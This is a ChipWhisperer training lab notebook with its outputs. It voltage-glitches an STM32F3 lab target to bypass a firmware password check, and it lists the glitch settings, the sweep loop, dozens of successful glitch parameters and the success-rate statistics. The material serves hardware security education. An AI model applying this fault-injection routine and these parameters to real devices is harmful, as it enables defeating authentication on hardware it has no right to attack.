# %% [markdown]
# # Part 2, Topic 2: Voltage Glitching to Bypass Password

# %% [markdown]
# ---
# NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.
#
# ---

# %% [markdown]
# **SUMMARY:** *We've seen how voltage glitching can be used to corrupt calculations, just like clock glitching. Let's continue on and see if it can also be used to break past a password check.*
#
# **LEARNING OUTCOMES:**
#
# * Applying previous glitch settings to new firmware
# * Checking for success and failure when glitching

# %% [markdown]
# ## Firmware
#
# Again, we've already covered this lab, so it'll be mostly up to you!

# %%
SCOPETYPE = 'OPENADC'
PLATFORM = 'CW308_STM32F3'
SS_VER = 'SS_VER_2_1'

# %%
# %run "../../Setup_Scripts/Setup_Generic.ipynb"
# Out:
# INFO: Found ChipWhisperer😍
# scope.gain.mode                          changed from low                       to high
# scope.gain.gain                          changed from 0                         to 30
# scope.gain.db                            changed from 5.5                       to 24.8359375
# scope.adc.basic_mode                     changed from low                       to rising_edge
# scope.adc.samples                        changed from 24400                     to 5000
# scope.adc.trig_count                     changed from 11762174                  to 24268508
# scope.clock.adc_src                      changed from clkgen_x1                 to clkgen_x4
# scope.clock.adc_freq                     changed from 60067359                  to 54334899
# scope.clock.adc_rate                     changed from 60067359.0                to 54334899.0
# scope.clock.clkgen_div                   changed from 1                         to 26
# scope.clock.clkgen_freq                  changed from 192000000.0               to 7384615.384615385
# scope.io.tio1                            changed from serial_tx                 to serial_rx
# scope.io.tio2                            changed from serial_rx                 to serial_tx
# scope.io.hs2                             changed from None                      to clkgen

# %%
# %%bash -s "$PLATFORM" "$SS_VER"
# cd ../../../hardware/victims/firmware/simpleserial-glitch
# make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j
# Out:
# SS_VER set to SS_VER_2_1
# SS_VER set to SS_VER_2_1
# SS_VER set to SS_VER_2_1
# SS_VER set to SS_VER_2_1
# make[1]: '.dep' is up to date.
# SS_VER set to SS_VER_2_1
# SS_VER set to SS_VER_2_1
# arm-none-eabi-gcc (15:10.3-2021.07-4) 10.3.1 20210621 (release)
# Copyright (C) 2020 Free Software Foundation, Inc.
# This is free software; see the source for copying conditions.  There is NO
# warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
#
# .
# Welcome to another exciting ChipWhisperer target build!!
# .
# Assembling: .././hal/stm32f3/stm32f3_startup.S
# arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir-CW308_STM32F3/stm32f3_startup.lst -I.././simpleserial/ -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir-CW308_STM32F3/stm32f3_startup.o
# .
# Compiling:
# -en     simpleserial-glitch.c ...
# -e Done!
# .
# Compiling:
# -en     .././hal/stm32f3/stm32f3_sysmem.c ...
# -e Done!
# .
# Compiling:
# -en     .././hal/stm32f3/stm32f3_hal.c ...
# -e Done!
# .
# Compiling:
# -en     .././simpleserial/simpleserial.c ...
# -e Done!
# .
# Compiling:
# -en     .././hal/stm32f3/stm32f3_hal_lowlevel.c ...
# -e Done!
# .
# LINKING:
# -en     simpleserial-glitch-CW308_STM32F3.elf ...
# -e Done!
# .
# Creating load file for Flash: simpleserial-glitch-CW308_STM32F3.hex
# arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-glitch-CW308_STM32F3.elf simpleserial-glitch-CW308_STM32F3.hex
# .
# Creating load file for Flash: simpleserial-glitch-CW308_STM32F3.bin
# arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature simpleserial-glitch-CW308_STM32F3.elf simpleserial-glitch-CW308_STM32F3.bin
# .
# Creating load file for EEPROM: simpleserial-glitch-CW308_STM32F3.eep
# arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
# --change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-glitch-CW308_STM32F3.elf simpleserial-glitch-CW308_STM32F3.eep || exit 0
# .
# Creating Extended Listing: simpleserial-glitch-CW308_STM32F3.lss
# arm-none-eabi-objdump -h -S -z simpleserial-glitch-CW308_STM32F3.elf > simpleserial-glitch-CW308_STM32F3.lss
# .
# Creating Symbol Table: simpleserial-glitch-CW308_STM32F3.sym
# arm-none-eabi-nm -n simpleserial-glitch-CW308_STM32F3.elf > simpleserial-glitch-CW308_STM32F3.sym
# SS_VER set to SS_VER_2_1
# SS_VER set to SS_VER_2_1
# Size after:
#    text	   data	    bss	    dec	    hex	filename
#    5664	      8	   1368	   7040	   1b80	simpleserial-glitch-CW308_STM32F3.elf
# +--------------------------------------------------------
# + Default target does full rebuild each time.
# + Specify buildtarget == allquick == to avoid full rebuild
# +--------------------------------------------------------
# +--------------------------------------------------------
# + Built for platform CW308T: STM32F3 Target with:
# + CRYPTO_TARGET = NONE
# + CRYPTO_OPTIONS =
# +--------------------------------------------------------

# %%
fw_path = "../../../hardware/victims/firmware/simpleserial-glitch/simpleserial-glitch-{}.hex".format(PLATFORM)
cw.program_target(scope, prog, fw_path)
if SS_VER=="SS_VER_2_1":
    target.reset_comms()
# Out:
# Detected known STMF32: STM32F302xB(C)/303xB(C)
# Extended erase (0x44), this can take ten seconds or more
# Attempting to program 5671 bytes at 0x8000000
# STM32F Programming flash...
# STM32F Reading flash...
# Verified flash OK, 5671 bytes

# %%
def reboot_flush():
    reset_target(scope)
    target.flush()
if PLATFORM == "CWLITEXMEGA":
    scope.clock.clkgen_freq = 32E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*32/7.37
    else:
        target.baud = 38400*32/7.37
elif (PLATFORM == "CWLITEARM") or ("F3" in PLATFORM):
    scope.clock.clkgen_freq = 24E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*24/7.37
    else:
        target.baud = 38400*24/7.37

# %%
#Do glitch loop
reboot_flush()
pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68])
target.simpleserial_write('p', pw)

val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
valid = val['valid']
if valid:
    response = val['payload']
    raw_serial = val['full_response']
    error_code = val['rv']

print(val)
# Out:
# {'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}

# %% [markdown]
# Like with clock glitching, the scope object can set some typical glitch settings for you:

# %%
if scope._is_husky:
    scope.vglitch_setup('hp', default_setup=False) # HP alone works best for Husky
else:
    scope.vglitch_setup('both', default_setup=False) # use both transistors

# %%
print(scope.io.hs2)
# Out:
# clkgen

# %%
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
gc.display_stats()
# Out:
# IntText(value=0, description='success count:', disabled=True)
# IntText(value=0, description='reset count:', disabled=True)
# IntText(value=0, description='normal count:', disabled=True)
# FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…
# FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…
# FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…

# %%
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr", "normal":None})
# Out:
# <style>*[data-root-id],
# *[data-root-id] > * {
#   box-sizing: border-box;
#   font-family: var(--jp-ui-font-family);
#   font-size: var(--jp-ui-font-size1);
#   color: var(--vscode-editor-foreground, var(--jp-ui-font-color1));
# }
#
# /* Override VSCode background color */
# .cell-output-ipywidget-background:has(
#     > .cell-output-ipywidget-background > .lm-Widget > *[data-root-id]
#   ),
# .cell-output-ipywidget-background:has(> .lm-Widget > *[data-root-id]) {
#   background-color: transparent !important;
# }
# </style>
# :DynamicMap   []
#    :Overlay
#       .Points.I  :Points   [width,offset]
#       .Points.II :Points   [width,offset]

# %%
if scope._is_husky:
    gc.set_range("width", 1900, 1901)
    gc.set_range("offset", 2000, 2500)
    gc.set_global_step([50])
    gc.set_step("ext_offset", 1)
else:
    if PLATFORM=="CWLITEXMEGA":
        gc.set_range("width", 43.5, 47.8)
        gc.set_range("offset", -48, -10)
        #gc.set_range("ext_offset", 7, 10)
        gc.set_range("ext_offset", 30, 45)
        scope.glitch.repeat = 11
    elif PLATFORM == "CWLITEARM":
        #should also work for the bootloader memory dump
        gc.set_range("width", 30.7, 36)
        gc.set_range("offset", -40, -35)
        gc.set_range("ext_offset", 0, 150)
        gc.set_global_step(0.4)
        gc.set_step("ext_offset", 1)
        scope.glitch.repeat = 7
    elif PLATFORM == "CW308_STM32F3":
        #these specific settings seem to work well for some reason
        #also works for the bootloader memory dump
        # gc.set_range("ext_offset", 11, 31)
        gc.set_range("ext_offset", 11, 45)
        gc.set_range("width", 43.6, 46.4)
        # gc.set_range("offset", -19, -21.5)
        gc.set_range("offset", -35, -15)
        gc.set_global_step(0.4)
        gc.set_step("ext_offset", 1)
        scope.glitch.repeat = 5
        
# gc.set_range("ext_offset", 0, 150)
# gc.set_step("ext_offset", 1) # check each clock cycle

# %%
#disable logging
cw.set_all_log_levels(cw.logging.CRITICAL)

scope.adc.timeout = 0.1
successes = 0

reboot_flush()

for glitch_settings in gc.glitch_values():
    scope.glitch.offset = glitch_settings[1]
    scope.glitch.width = glitch_settings[0]
    scope.glitch.ext_offset = glitch_settings[2]
    if scope.adc.state:
        # can detect crash here (fast) before timing out (slow)
        #print("Trigger still high!")
        gc.add("reset")
        reboot_flush()

    scope.arm()
    target.simpleserial_write('p', bytearray([0]*5))
    ret = scope.capture()
    scope.io.vglitch_reset()
    if ret:
        #print('Timeout - no trigger')
        gc.add("reset")

        #Device is slow to boot?
        reboot_flush()
    else:
        val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50)#For loop check
        if val['valid'] is False:
            gc.add("reset")
        else:
            if val['payload'] == bytearray([1]): #for loop check
                successes +=1 
                gc.add("success")
                print(val)
                print(val['payload'])
                print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)
                print("🐙", end="")
            else:
                gc.add("normal")
                    
#reenable logging
cw.set_all_log_levels(cw.logging.WARNING)
# Out:
# {'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 43.75 -21.09375 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -29.6875 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -27.734375 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -26.953125 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -26.5625 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -26.171875 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -25.78125 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -25.390625 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -24.609375 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -23.4375 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -23.046875 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -22.265625 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -21.484375 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -18.75 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -16.40625 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.140625 -16.40625 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -35.15625 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -34.765625 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -33.984375 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -33.984375 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -33.59375 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -32.8125 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -32.421875 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -32.03125 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -32.03125 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -31.640625 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -31.640625 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -31.640625 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -31.25 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -30.859375 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -30.859375 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -30.46875 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -29.6875 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -28.515625 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -28.125 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -28.125 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -27.734375 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -26.953125 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -17.96875 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -17.578125 36
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -16.015625 16
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.53125 -16.015625 26
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.921875 -25.0 44
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.921875 -24.21875 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 44.921875 -23.4375 33
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.3125 -25.0 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.3125 -24.21875 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -34.765625 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -32.03125 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -28.90625 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -26.953125 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -26.953125 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -24.609375 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -23.4375 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -22.265625 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -21.875 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -21.09375 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -20.3125 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 45.703125 -17.1875 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -18.75 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -17.96875 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -17.578125 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -17.578125 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -17.1875 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -17.1875 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -16.40625 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -16.015625 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -15.625 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -15.625 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -15.234375 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -15.234375 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -14.84375 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -14.84375 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.09375 -14.84375 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -27.734375 38
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -20.3125 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -20.3125 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -19.921875 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -19.921875 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -19.53125 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -18.359375 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -17.96875 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -17.578125 35
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -16.015625 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -15.625 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -15.234375 17
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -15.234375 27
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -15.234375 37
# 🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 46.484375 -14.84375 27
# 🐙

# %% [markdown]
# Let's see where we needed to target for our glitch to work:

# %%
gc.calc(["width", "offset"], "success_rate")
# Out:
# [((37,),
#   {'total': 685,
#    'success': 19,
#    'success_rate': 0.027737226277372264,
#    'reset': 466,
#    'reset_rate': 0.6802919708029197,
#    'normal': 200,
#    'normal_rate': 0.291970802919708}),
#  ((16,),
#   {'total': 716,
#    'success': 15,
#    'success_rate': 0.02094972067039106,
#    'reset': 563,
#    'reset_rate': 0.7863128491620112,
#    'normal': 138,
#    'normal_rate': 0.19273743016759776}),
#  ((26,),
#   {'total': 721,
#    'success': 15,
#    'success_rate': 0.020804438280166437,
#    'reset': 574,
#    'reset_rate': 0.7961165048543689,
#    'normal': 132,
#    'normal_rate': 0.18307905686546463}),
#  ((27,),
#   {'total': 668,
#    'success': 13,
#    'success_rate': 0.019461077844311378,
#    'reset': 419,
